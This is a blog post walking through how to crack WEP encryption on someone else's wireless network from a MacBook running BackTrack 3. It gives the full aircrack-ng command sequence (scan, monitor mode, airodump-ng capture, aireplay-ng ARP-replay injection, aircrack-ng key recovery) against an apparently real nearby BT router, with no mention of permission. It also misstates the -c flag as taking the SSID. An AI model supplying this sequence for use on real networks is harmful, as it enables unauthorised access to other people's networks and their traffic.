---
layout: post
title: Cracking WEP with packet injection on a macbook
---

### {{ page.title }}

Just thought I'd share my experience with getting packet injection working on the macbook, using the internal wireless card (AirPort Extreme).

#### So why would you want to inject packets into another  wireless network??

So to break WEP we need IVs.......
> With only 24 bits, WEP eventually uses the same IV for different data packets. For a large busy network, this reoccurrence of IVs can happen within an hour or so. This results in the transmission of frames having keystreams that are too similar. If a hacker collects enough frames based on the same IV, the individual can determine the shared values among them
[www.wi-fiplanet.com](http://www.wi-fiplanet.com/tutorials/article.php/1368661)

So from the above article (very good read btw) you can see if we have enough IVs we can decrypt the traffic and calculate the PSK (Pre-Shared Key) for the given AP (Access Point). This is all well and good, but I could take a long time to gain enough traffic to perform this type of attack, this is where packet injection comes to the rescue! Using packet injection we can create new traffic on the network and therefore give us more IVs! It sounds a little crazy - how can the fact that we're injecting traffic generate new IVs? If we could generate IVs - why bother injecting?? - Well there's a few nice tricks...read on...

#### So what do we inject?

There are a few options, but my favourite is an ARP reply (and is probably the simplest to understand). If you don't know what ARP is or don't really understand it, try and read the [RFC](ftp://ftp.isi.edu/in-notes/rfc826.txt) or maybe the shorter ARP [tutorial](http://www.inetdaemon.com/tutorials/lan/arp.shtml).

So while sniffing the encrypted network we look out for a packet the same size as a ARP packet, we can't read it because its encrypted – but we can be quite sure its a ARP packet due to its size (could even check for a response packet of the correct size to just to make sure). Once we have that packet we can fire it back into the network (replay) which will be answered by the appropriate machine on the subnet, therefore producing more traffic and IVs. We can just keep replaying the ARP request to generate loads of IVs!!

#### How how how?

I don't think you'll have much luck trying this on OSX, Linux is your friend when it comes to this kind of stuff. Try using BackTrack3 – its a livecd full of security tools, very nice. Download the CD or the USB image from [www.remote-exploit.com](http://www.remote-exploit.org/backtrack_download.html) – make sure you get BackTrack 3, I'm using BackTrack 3 Beta – 14-12-2007 (CD). Write the CD out with your favourite app, DiskUtil or cdrecord depending on your OS. Once you've got the CD – boot off it!

Once you've got your desktop up (assuming you picked a graphical frontend) open a bunch of consoles (you'll need at least 3).

OK, let see what's out there.....

    bt ~ # ifconfig ath0 up
    bt ~ # iwlist ath0 scan
          Cell 01 - Address: 00:11:F5:99:99:F1
          ESSID:\"BTVOYAGER9999-F1\"
          Mode:Master
          Frequency:2.412 GHz (Channel 1)
          Quality=4/70  Signal level=-91 dBm  Noise level=-95 dBm
          Encryption key:on
          Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
          24 Mb/s; 36 Mb/s; 54 Mb/s; 6 Mb/s; 9 Mb/s
          12 Mb/s; 48 Mb/s
          Extra:bcn_int=100
          Cell 02 - Address: 00:0E:2E:0D:FF:F1
          ESSID:\"default\"
          Mode:Master
          Frequency:2.462 GHz (Channel 11)
          Quality=4/70  Signal level=-91 dBm  Noise level=-95 dBm
    ...
    ...

So we're going to go after BTVOYAGER9999-F1 (yes I've changed the MAC and SSID), so lets tune to card to the right channel. The '1' on the end of the second command is the channel to tune to.


    bt ~ # airmon-ng stop ath0
    ...
    bt ~ # airmon-ng start wifi0 1
    ...

We should now be only listening to channel 1 – otherwise we'd be hopping between channels and wouldn't get as much data. Now we need to start sniffing the network traffic. The command arguments are quite obvious (-c is the SSID, --bssid is the AP MAC address and -w the output file)...


    bt ~ # airodump-ng -c BTVOYAGER9999-F1 –bssid 00:11:F5:99:99:F1 -w results ath0

You're now sniffing all the packets you can see. On the bottom of the screen you should see all the clients we've seen so far. These are important because at the moment we're just passively sniffing the network and it could take ages to get enough traffic – so we're going to inject some ARP packets. So once you see a valid client on the network...one another console (-3 mean perform an ARP reply, -b is the AP MAC address and -h is the clients MAC address)

    bt ~ # aireplay-ng -3 -b 00:11:F5:99:99:F1 -h 00:C0:01:D0:0D:01 ath0

aireplay-ng should now be listening for ARP packets and once one comes along it will replay that packet to generate loads of traffic! - its quite obvious when I starts injecting packets – just watch the DATA column on the airodump-ng console!!

So new we're getting loads of packets – lets try and crack the PSK!

    bt ~ # aircrack-ng results-01.cap

aircrack will try and crack the PSK from the packet capture – if there's not enough IVs yet it will wait until you have somemore until it manages to crack it. It should responsibly quickly present you with the PSK!! (completely depending on how many packets/sec your getting.)

Hope that gets you started...feel free to post questions..

